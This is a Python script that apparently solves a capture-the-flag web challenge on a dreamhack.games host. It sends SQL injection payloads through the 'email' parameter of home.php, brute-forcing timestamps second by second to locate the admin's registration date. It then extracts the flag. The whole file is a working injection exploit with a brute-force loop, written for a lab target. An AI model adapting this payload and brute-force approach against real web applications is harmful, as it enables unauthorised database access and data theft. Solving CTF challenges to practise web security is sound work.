import requests
from datetime import datetime, timedelta
import re

url = 'http://host3.dreamhack.games:18383/'
s = requests.Session()

def get_date(username, email):
    res = s.get(f'{url}/home.php', params={
        'username': username,
        'email': email
    })

    date = re.findall(r'([0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2})', res.text)[0].strip()

    return date

guest3 = get_date('guest3', 'guest3@gmail.com')
guest4 = get_date('guest4', 'guest4@gmail.com')

start = datetime.strptime(guest3, '%Y-%m-%d %H:%M:%S')
end = datetime.strptime(guest4, '%Y-%m-%d %H:%M:%S')

# bruteforce timestamps
current = start
cands = []

while current < end:
    current += timedelta(seconds=1)

    date = datetime.strftime(current, '%Y@%m@%d %H@%M@%S')

    print("Trying:", date)

    payload = "' or regdate like timestamp'%s' or '" % date

    res = s.get(f"{url}/home.php", params={
        'username': 'a',
        'email': payload
    })

    if 'not found' not in res.text.lower():
        cands.append(date)

print("> Admin dates:", cands)

# bruteforce admin cands
for cand in cands:
    payload = "' or regdate like timestamp'%s' or '" % cand

    res = s.get(f"{url}/home.php", params={
        'username': 'a',
        'email': payload
    })

    try:
        flag = re.findall(r'(BISC{.+?})', res.text)[0].strip()

        print("Flag:", flag)
    except:
        ...